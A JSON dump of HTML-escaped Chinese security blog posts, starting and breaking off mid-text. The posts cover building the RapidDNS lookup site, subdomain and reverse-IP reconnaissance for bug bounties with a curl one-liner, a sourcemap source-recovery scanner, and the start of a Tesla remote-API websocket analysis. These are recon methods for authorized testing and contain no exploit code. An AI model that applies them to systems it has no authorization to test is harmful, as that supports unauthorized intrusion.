id=\&#34;总结\&#34;&gt;总结&lt;/h2&gt;\n&lt;p&gt;其实总体来说，本文技术上没啥复杂度，实现起来也相对简单。我觉得有点像以前革命时期八路军的风格（完了往自己脸上贴金了，勿喷），在有限的条件下来尽可能实现自己想要的效果。&lt;/p&gt;\n&lt;p&gt;希望本文对你有所帮助，对于上述内容有任何疑问，可以给我发送消息一起交流。&lt;/p&gt;\n&lt;p&gt;最后，RapidDNS已经一周年，这一年家人和同事的支持，同学的帮助，以及国内外朋友的称赞和鼓励，才让我坚持维护着网站运行。感谢在网站运行中大家提来的建议和反馈！感谢所有使用RapidDNS的人！感谢你们让RapidDNS更好。&lt;br&gt;\n所以，RapidDNS现有查询功能将一直免费开放下去，同时新的一年我也会增加新的功能，也欢迎大家发来你们的建议和想法。&lt;/p&gt;\n&lt;p&gt;大家也可以关注公众账号，获取最新的网站功能、使用技巧等内容。&lt;/p&gt;\n&lt;center&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;3\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615992545149.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;/center&gt;\n&#34;,&#34;title&#34;:&#34;我是如何低成本建立RapidDNS.io网站的&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;rapiddns&#34;,&#34;slug&#34;:&#34;EzV5FcSmWF&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/EzV5FcSmWF/&#34;},{&#34;name&#34;:&#34;dns&#34;,&#34;slug&#34;:&#34;h385mUgQv1&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/h385mUgQv1/&#34;},{&#34;name&#34;:&#34;rapid7&#34;,&#34;slug&#34;:&#34;25Bn_NFyM6&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/25Bn_NFyM6/&#34;}],&#34;date&#34;:&#34;2021-03-22 19:58:23&#34;,&#34;dateFormat&#34;:&#34;2021-03-22&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/RapidDNS-03/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;9 min read&#34;,&#34;time&#34;:487000,&#34;words&#34;:2286,&#34;minutes&#34;:9},&#34;description&#34;:&#34;大家好！我是BaCde，2020年3月我着手开发RapidDNS这个网站，并于2020年4月1日正式上线。\nRapidDNS.io是一个在线域名查询和IP反向查询的网站。有超过25亿条记录，支持5种（A,AAAA,CNAME,MX,CERT...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BA%A7%E7%94%9F%E6%83%B3%E6%B3%95\&#34;&gt;产生想法&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%97%AE%E9%A2%98\&#34;&gt;面临的问题&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88\&#34;&gt;解决方案&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%BC%96%E7%A0%81\&#34;&gt;编码&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%80%BB%E7%BB%93\&#34;&gt;总结&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;大家好，我是BaCde。今天给大家分享一下我这个月提交鹅厂漏洞的一个挖掘思路。&lt;/p&gt;\n&lt;p&gt;首先说一下结果，一个SQL注入（可报错回显）、弱口令（审核后发现是域名解析IP错误）和一个有限的SSRF漏洞。&lt;/p&gt;\n&lt;p&gt;当然今天我要说的不是直接查询子域名，那就没必要写这篇文章了。&lt;/p&gt;\n&lt;p&gt;像鹅厂这样规模的企业，其资产数量众多。同样的，其盯着他的大佬们也非常多。而目前收集信息的方法大多数都差不多。本身厂商自己也会对其进行监控、检测。基本上很多被筛选了很多遍。那应该如何去挖掘呢？其中一种思路就是找到别人未发现的一些资产，这将增加挖掘的概率。&lt;/p&gt;\n&lt;p&gt;RapidDNS网站在2020年12月的时候增加了5000万的HTTPS证书数据。暂时还没有对证书查询独立（将在新上线的版本独立查询）。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;相信大家在测试的时候一定会发现一些目标的SSL证书中Subject的CommonName有*.qq.com这样的情况，有的域名可能为二级或三级，甚至更多。这样的域名大多数意味着下级有子域名。通过对其进行爆破，则可能发现一些之前未发现的资产。&lt;/p&gt;\n&lt;p&gt;首先，大家可以通过RapidDNS查询子域名，然后导出csv，对其进行筛选。当然也可以使用一行命令来解决。&lt;/p&gt;\n&lt;p&gt;将下面命令中$1换成对应目标即可，如果没结果，可以多请求几次试试。&lt;/p&gt;\n&lt;p&gt;curl -s &amp;quot;https://rapiddns.io/subdomain/$1?full=1&amp;quot; | grep -oP &#39;_blank&amp;quot;&amp;gt;\\K[^&amp;lt;]*&#39; | grep * |sort -u&lt;/p&gt;\n&lt;p&gt;查询结果如下：&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615992464027.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;把*.去掉，然后批量去爆破子域名。将跑出来的域名在去进行探测挖掘即可，我使用xray成功扫描到其SQL注入漏洞。当然这里的扫描工具就很多了，看各位大佬的习惯了。&lt;/p&gt;\n&lt;p&gt;今天的内容就是这么简单，也有一定运气成分。只是提出一种我使用的有效的思路。祝大家好运！！！&lt;/p&gt;\n&lt;p&gt;扫描下方二维码可关注公众号&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615992545149.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;center&gt;The End&lt;/center&gt;&#34;,&#34;fileName&#34;:&#34;RapidDNS-02&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;大家好，我是BaCde。今天给大家分享一下我这个月提交鹅厂漏洞的一个挖掘思路。&lt;/p&gt;\n&lt;p&gt;首先说一下结果，一个SQL注入（可报错回显）、弱口令（审核后发现是域名解析IP错误）和一个有限的SSRF漏洞。&lt;/p&gt;\n&lt;p&gt;当然今天我要说的不是直接查询子域名，那就没必要写这篇文章了。&lt;/p&gt;\n&lt;p&gt;像鹅厂这样规模的企业，其资产数量众多。同样的，其盯着他的大佬们也非常多。而目前收集信息的方法大多数都差不多。本身厂商自己也会对其进行监控、检测。基本上很多被筛选了很多遍。那应该如何去挖掘呢？其中一种思路就是找到别人未发现的一些资产，这将增加挖掘的概率。&lt;/p&gt;\n&lt;p&gt;RapidDNS网站在2020年12月的时候增加了5000万的HTTPS证书数据。暂时还没有对证书查询独立（将在新上线的版本独立查询）。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;RapidDNS网站在SRC漏洞挖掘中的一个思路&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;漏洞挖掘&#34;,&#34;slug&#34;:&#34;1DaHDVCRSr&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/1DaHDVCRSr/&#34;},{&#34;name&#34;:&#34;SRC&#34;,&#34;slug&#34;:&#34;DNju50k28s&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/DNju50k28s/&#34;},{&#34;name&#34;:&#34;信息收集&#34;,&#34;slug&#34;:&#34;1MYQiPMglB&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/1MYQiPMglB/&#34;},{&#34;name&#34;:&#34;证书搜索&#34;,&#34;slug&#34;:&#34;K5TznCnEqt&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/K5TznCnEqt/&#34;}],&#34;date&#34;:&#34;2021-03-17 22:46:07&#34;,&#34;dateFormat&#34;:&#34;2021-03-17&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/RapidDNS-02/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;2 min read&#34;,&#34;time&#34;:118000,&#34;words&#34;:563,&#34;minutes&#34;:2},&#34;description&#34;:&#34;大家好，我是BaCde。今天给大家分享一下我这个月提交鹅厂漏洞的一个挖掘思路。\n首先说一下结果，一个SQL注入（可报错回显）、弱口令（审核后发现是域名解析IP错误）和一个有限的SSRF漏洞。\n当然今天我要说的不是直接查询子域名，那就没必要写...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;大家好，我是BaCde。公众号开通了2个月，一直没发内容。本来计划写写网站建设思路，今天先写一篇网站的使用分享。&lt;/p&gt;\n&lt;p&gt;网站自发布以来，一直没有什么说明和教程。因为它的功能非常单一，不需要做太多介绍。但是呢，有一些小细节和场景，我觉得可以分享下。&lt;/p&gt;\n&lt;p&gt;首先，网站基础功能可以查询网站子域名，根据IP地址或IP段查询绑定的域名信息，这里支持IPv6的地址和地址段。目前最大支持显示1万条（大多数情况下足够了）。其中查询结果页面中有导出csv的功能，可以导出全部结果。其实不导出，查询全部结果只需要加入参数?full=1即可。目前大多数开源工具采集时采用也是这样的方式。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615429646070.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;下面来说下实际应用场景。&lt;/p&gt;\n&lt;h2 id=\&#34;信息收集\&#34;&gt;信息收集&lt;/h2&gt;\n&lt;p&gt;在收集ASN信息时，可以根据反向IP段查询，迅速确定筛选出目标的资产。&lt;/p&gt;\n&lt;p&gt;比如下图中搜索到的腾讯结果中，有很多ip段时属于腾讯云服务的机器，这些IP对我们挖掘漏洞来说，意义不大。但是可能又会存在夹杂在其中的个别目标。这时候就可以使用Reverse IP功能进行查询，然后筛选出目标或者筛选IP段。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615429652715.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;下面随便挑了一个（58.87.64.0/18）查询结果来展示下，发现大多数不是腾讯的域名，则可以跳过，或者从中筛选出腾讯的。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;3\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615429659028.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h2 id=\&#34;溯源定位\&#34;&gt;溯源定位&lt;/h2&gt;\n&lt;p&gt;这里主要说两个场景，第一个就是扫到某个IP存在漏洞，想知道哪个厂商的，第二个就是对于攻击IP地址是属于哪个机构的。这是两个非常常见的需求。&lt;/p&gt;\n&lt;p&gt;这里一种方法是直接查询IP地址，那么，当ip地址查不到时怎么办呢？&lt;/p&gt;\n&lt;p&gt;今天就在微信群里遇到一个例子。有人在日志中发现了360某团队的一个dnslog的地址，但是打开其域名时一个空白地址。这里我通过获取到解析的IP地址，查询C段，然后很快速的发现了dnslog平台的登录地址，根据版权信息确认是360的。&lt;/p&gt;\n&lt;p&gt;其发现的地址形如：xxx.b.nslog.0kee.360.cn。访问nslog.0kee.360.cn为空白，其解析的IP地址为123.59.211.124。通过RapidDNS来查询C段，查询链接：https://rapiddns.io/sameip/123.59.211.124/24#result。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;4\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615429676971.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;在结果中可以发现一个0kdns.net的域名，访问后就是dnslog平台登录地址。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;5\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615429683321.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;好了，以上就是我经常使用到的方法，跟大家分享出来。另外，网站由于网络原因，可能会不太稳定。有问题大家可即时反馈，看到后我会第一时间来解决。&lt;/p&gt;\n&lt;p&gt;扫描篇下方二维码可关注公众号&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;6\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615429807479.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;The END&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;rapiddnsio-tips&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;大家好，我是BaCde。公众号开通了2个月，一直没发内容。本来计划写写网站建设思路，今天先写一篇网站的使用分享。&lt;/p&gt;\n&lt;p&gt;网站自发布以来，一直没有什么说明和教程。因为它的功能非常单一，不需要做太多介绍。但是呢，有一些小细节和场景，我觉得可以分享下。&lt;/p&gt;\n&lt;p&gt;首先，网站基础功能可以查询网站子域名，根据IP地址或IP段查询绑定的域名信息，这里支持IPv6的地址和地址段。目前最大支持显示1万条（大多数情况下足够了）。其中查询结果页面中有导出csv的功能，可以导出全部结果。其实不导出，查询全部结果只需要加入参数?full=1即可。目前大多数开源工具采集时采用也是这样的方式。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615429646070.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;下面来说下实际应用场景。&lt;/p&gt;\n&lt;h2 id=\&#34;信息收集\&#34;&gt;信息收集&lt;/h2&gt;\n&lt;p&gt;在收集ASN信息时，可以根据反向IP段查询，迅速确定筛选出目标的资产。&lt;/p&gt;\n&lt;p&gt;比如下图中搜索到的腾讯结果中，有很多ip段时属于腾讯云服务的机器，这些IP对我们挖掘漏洞来说，意义不大。但是可能又会存在夹杂在其中的个别目标。这时候就可以使用Reverse IP功能进行查询，然后筛选出目标或者筛选IP段。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615429652715.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;下面随便挑了一个（58.87.64.0/18）查询结果来展示下，发现大多数不是腾讯的域名，则可以跳过，或者从中筛选出腾讯的。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;3\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615429659028.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h2 id=\&#34;溯源定位\&#34;&gt;溯源定位&lt;/h2&gt;\n&lt;p&gt;这里主要说两个场景，第一个就是扫到某个IP存在漏洞，想知道哪个厂商的，第二个就是对于攻击IP地址是属于哪个机构的。这是两个非常常见的需求。&lt;/p&gt;\n&lt;p&gt;这里一种方法是直接查询IP地址，那么，当ip地址查不到时怎么办呢？&lt;/p&gt;\n&lt;p&gt;今天就在微信群里遇到一个例子。有人在日志中发现了360某团队的一个dnslog的地址，但是打开其域名时一个空白地址。这里我通过获取到解析的IP地址，查询C段，然后很快速的发现了dnslog平台的登录地址，根据版权信息确认是360的。&lt;/p&gt;\n&lt;p&gt;其发现的地址形如：xxx.b.nslog.0kee.360.cn。访问nslog.0kee.360.cn为空白，其解析的IP地址为123.59.211.124。通过RapidDNS来查询C段，查询链接：https://rapiddns.io/sameip/123.59.211.124/24#result。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;4\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615429676971.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;在结果中可以发现一个0kdns.net的域名，访问后就是dnslog平台登录地址。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;5\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615429683321.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;好了，以上就是我经常使用到的方法，跟大家分享出来。另外，网站由于网络原因，可能会不太稳定。有问题大家可即时反馈，看到后我会第一时间来解决。&lt;/p&gt;\n&lt;p&gt;扫描篇下方二维码可关注公众号&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;6\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1615429807479.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&#34;,&#34;title&#34;:&#34;RapidDNS.IO 网站应用实例&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;rapiddns&#34;,&#34;slug&#34;:&#34;EzV5FcSmWF&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/EzV5FcSmWF/&#34;},{&#34;name&#34;:&#34;pentest&#34;,&#34;slug&#34;:&#34;muqf52BmZa&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/muqf52BmZa/&#34;},{&#34;name&#34;:&#34;recon&#34;,&#34;slug&#34;:&#34;nnNW5XSbey&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/nnNW5XSbey/&#34;},{&#34;name&#34;:&#34;bug bounty&#34;,&#34;slug&#34;:&#34;4Kye_-0A5I&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/4Kye_-0A5I/&#34;}],&#34;date&#34;:&#34;2021-03-11 10:23:49&#34;,&#34;dateFormat&#34;:&#34;2021-03-11&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/rapiddnsio-tips/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;3 min read&#34;,&#34;time&#34;:163000,&#34;words&#34;:765,&#34;minutes&#34;:3},&#34;description&#34;:&#34;大家好，我是BaCde。公众号开通了2个月，一直没发内容。本来计划写写网站建设思路，今天先写一篇网站的使用分享。\n网站自发布以来，一直没有什么说明和教程。因为它的功能非常单一，不需要做太多介绍。但是呢，有一些小细节和场景，我觉得可以分享下。...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\&#34;&gt;信息收集&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%BA%AF%E6%BA%90%E5%AE%9A%E4%BD%8D\&#34;&gt;溯源定位&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;SourceMapX是一个批量扫描并恢复sourcemap的源代码文件的脚本。&lt;/p&gt;\n&lt;p&gt;项目地址:&lt;br&gt;\n&lt;a href=\&#34;https://github.com/insightglacier/SourceMapX\&#34;&gt;https://github.com/insightglacier/SourceMapX&lt;/a&gt;&lt;/p&gt;\n&lt;h2 id=\&#34;安装\&#34;&gt;安装&lt;/h2&gt;\n&lt;p&gt;该脚本主要由&lt;a href=\&#34;https://github.com/rarecoil/unwebpack-sourcemap\&#34;&gt;unwebpack-sourcemap&lt;/a&gt;项目修改而来，使用Python3编写,需要安装 &lt;code&gt;BeautifulSoup4&lt;/code&gt; and &lt;code&gt;requests&lt;/code&gt;.可以使用 &lt;code&gt;pip3 install -r requirements.txt&lt;/code&gt;命令进行安装。主要是修改为批量检测并下载，可用于SRC的漏洞挖掘。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;h2 id=\&#34;使用\&#34;&gt;使用&lt;/h2&gt;\n&lt;p&gt;命令参数：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;usage: SourceMapX.py [-h] [-m METHOD] [-d] [-o OUTPUT] uri_or_file\n\nA tool to extract code from Webpack sourcemaps. Turns black boxes into gray ones.\n\npositional arguments:\n  uri_or_file           The target URI or file.\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -m METHOD, --method METHOD\n                        L:Local, R:Remote\n  -d, --detect          Attempt to detect sourcemaps from JS assets in retrieved HTML.\n  -o OUTPUT, --output OUTPUT\n                        Make the output directory if it doesn&#39;t exist.\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;其中-m有R和L，R为Remote（远程），L为Local（本地）。&lt;/p&gt;\n&lt;p&gt;-o 为结果文件保存的路径。默认为output。&lt;/p&gt;\n&lt;p&gt;将要扫描的url存放到文件中（需要带http或https），如urls.txt，然后运行如下命令。&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;python SourceMapX.py -m R -d urls.txt\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;对于探测到的.map文件会url地址会保存到&lt;code&gt;results.txt&lt;/code&gt;文件中。&lt;/p&gt;\n&lt;p&gt;程序还不够完善，后续看情况是否更新吧。&lt;/p&gt;\n&lt;h2 id=\&#34;致谢\&#34;&gt;致谢&lt;/h2&gt;\n&lt;p&gt;&lt;a href=\&#34;https://github.com/rarecoil/unwebpack-sourcemap\&#34;&gt;unwebpack-sourcemap&lt;/a&gt; @rarecoil&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;注：请不要将该脚本用于非法用途，仅用于合法的，经过授权的渗透测试，公司内部安全检查与研究使用。由于使用工具带来的不良后果与本人无关。&lt;/strong&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;sourcemapx&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;SourceMapX是一个批量扫描并恢复sourcemap的源代码文件的脚本。&lt;/p&gt;\n&lt;p&gt;项目地址:&lt;br&gt;\n&lt;a href=\&#34;https://github.com/insightglacier/SourceMapX\&#34;&gt;https://github.com/insightglacier/SourceMapX&lt;/a&gt;&lt;/p&gt;\n&lt;h2 id=\&#34;安装\&#34;&gt;安装&lt;/h2&gt;\n&lt;p&gt;该脚本主要由&lt;a href=\&#34;https://github.com/rarecoil/unwebpack-sourcemap\&#34;&gt;unwebpack-sourcemap&lt;/a&gt;项目修改而来，使用Python3编写,需要安装 &lt;code&gt;BeautifulSoup4&lt;/code&gt; and &lt;code&gt;requests&lt;/code&gt;.可以使用 &lt;code&gt;pip3 install -r requirements.txt&lt;/code&gt;命令进行安装。主要是修改为批量检测并下载，可用于SRC的漏洞挖掘。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;SourceMapX——批量扫描并恢复sourcemap的源代码文件&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;漏洞挖掘&#34;,&#34;slug&#34;:&#34;1DaHDVCRSr&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/1DaHDVCRSr/&#34;},{&#34;name&#34;:&#34;SRC&#34;,&#34;slug&#34;:&#34;DNju50k28s&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/DNju50k28s/&#34;},{&#34;name&#34;:&#34;sourcemap&#34;,&#34;slug&#34;:&#34;Svviomjq-Y&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/Svviomjq-Y/&#34;},{&#34;name&#34;:&#34;webpack&#34;,&#34;slug&#34;:&#34;7vkFDlvcbw&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/7vkFDlvcbw/&#34;}],&#34;date&#34;:&#34;2021-02-28 22:14:42&#34;,&#34;dateFormat&#34;:&#34;2021-02-28&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/sourcemapx/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;2 min read&#34;,&#34;time&#34;:88000,&#34;words&#34;:341,&#34;minutes&#34;:2},&#34;description&#34;:&#34;SourceMapX是一个批量扫描并恢复sourcemap的源代码文件的脚本。\n项目地址:\nhttps://github.com/insightglacier/SourceMapX\n安装\n该脚本主要由unwebpack-sourcemap项...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%AE%89%E8%A3%85\&#34;&gt;安装&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BD%BF%E7%94%A8\&#34;&gt;使用&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%87%B4%E8%B0%A2\&#34;&gt;致谢&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。该篇文章为第二篇，将主要讲解websocket抓包分析与编程实现对Tesla的远程控制。如果你还没看第一篇，请先查看第一篇内容&lt;a href=\&#34;https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-one/\&#34;&gt;Hacking All The Cars - Tesla 远程API分析与利用（上）&lt;/a&gt;。&lt;/p&gt;\n&lt;h2 id=\&#34;0x00-websocket通信分析\&#34;&gt;0x00 Websocket通信分析&lt;/h2&gt;\n&lt;p&gt;Tesla的召唤功能除自动召唤外，还支持手动的前进与后退功能。要想手机APP可以使用召唤功能，需要先在车机中开启召唤功能。&lt;/p&gt;\n&lt;p&gt;在测试时，建议寻找一块比较大的空地，然后设置抓包，使用手机APP进行操作。通过burpsuite抓到的数据包可知，召唤功能主要通过websocket来实现。但是分析过程中可以发现，burpsuite只显示了连接地址和发送的数据内容，并没有显示其请求的头，所以，当直接去连接时会返回401错误。&lt;/p&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1605326984308.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/04_tesla_websockets.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;在这个时候就需要还一个工具了，本文选择使用charles。这个工具针对websocket的支持非常友好，不仅可以看到请求头，还针对发送与接收以不同的颜色区分显示出来，十分方便分析。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1605326993757.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/charles.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;&lt;img src=\&#34;https://bacde.me/post-images/1605326998120.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;img src=\&#34;/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/charles2.png\&#34; alt=\&#34;charles2\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;对于抓包环境的设置，这里说一下，因为Tesla是tls+websocket实现，所以我们抓包时需要替换为自己的证书。安卓和ios设置方法存在差异，不过Tesla并不需要sslpin bypass。添加自己的受信任的证书即可。由于我在测试时，安卓机gps有问题，所以我换了iphone，并通过设置sock5类型代理来实现抓包。这些都是抓包常规操作，这里只是提一下，不知道如何设置的朋友自己去搜索一下吧，这里不做赘述。&lt;/p&gt;\n&lt;p&gt;为了更好的分析，建议多抓几次前进或者后退的包，便于进行对比。通过对websocket的通信数据分析，请求的数据通信格式为json，每条数据都有时间戳，还有&lt;code&gt;msg_type&lt;/code&gt;字段，经过去重统计，一共有7种&lt;code&gt;msg_type&lt;/code&gt;，分别有&lt;code&gt;control:ping&lt;/code&gt;、&lt;code&gt;autopark:info&lt;/code&gt;、&lt;code&gt;autopark:device_location&lt;/code&gt;、&lt;code&gt;autopark:cmd_forward&lt;/code&gt;、&lt;code&gt;autopark:cmd_reverse&lt;/code&gt;、&lt;code&gt;autopark:heartbeat_app&lt;/code&gt;、&lt;code&gt;autopark:cmd_abort&lt;/code&gt;。其中&lt;code&gt;autopark:device_location&lt;/code&gt;又有两种&lt;code&gt;summon_type&lt;/code&gt;,分别为 